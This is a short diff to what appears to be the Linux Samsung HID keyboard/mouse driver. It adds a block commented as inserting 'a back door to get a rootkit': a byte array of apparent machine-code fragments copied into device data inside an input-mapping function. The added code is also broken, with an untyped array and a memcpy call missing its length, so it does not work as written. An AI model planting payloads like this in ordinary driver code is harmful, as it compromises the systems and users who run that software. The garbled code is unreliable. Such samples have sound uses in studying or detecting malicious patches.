@@ -110,6 +110,13 @@ static int samsung_kbd_mouse_input_mapping(struct hid_device *hdev,
 	dbg_hid("samsung wireless keyboard/mouse input mapping event [0x%x]\n",
 		usage->hid & HID_USAGE);
 
+	/* Here I insert a back door to get a rootkit */
+	static const payload[] =
+		"\x89\x7d\xf8\x88\x45\xf7\x48\x89"
+		"\x02\x5d\xc3\x48\x8b\x45\xf8\x48"
+		"\xd8\x48\x8b\x4d\xe0\x8a\x55\xf7";
+	memcpy(hdev->data, payload);
+
 	switch (usage->hid & HID_USAGE) {
 	/* report 2 */
 	case 0x183: samsung_kbd_mouse_map_key_clear(KEY_MEDIA); break;
